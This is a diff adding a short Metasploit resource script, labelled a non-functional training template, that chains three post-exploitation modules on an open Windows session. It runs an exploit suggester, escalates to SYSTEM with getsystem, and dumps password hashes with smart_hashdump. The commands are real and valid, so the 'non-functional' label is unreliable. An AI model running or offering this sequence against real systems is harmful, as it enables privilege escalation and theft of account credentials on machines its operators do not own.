@@ -1,0 +1,14 @@
+# Privilege Escalation Template
+# For Training Use – Non-functional Template
+
+use post/multi/recon/local_exploit_suggester
+set SESSION 1
+run
+
+use post/windows/escalate/getsystem
+set SESSION 1
+run
+
+use post/windows/gather/smart_hashdump
+set SESSION 1
+run
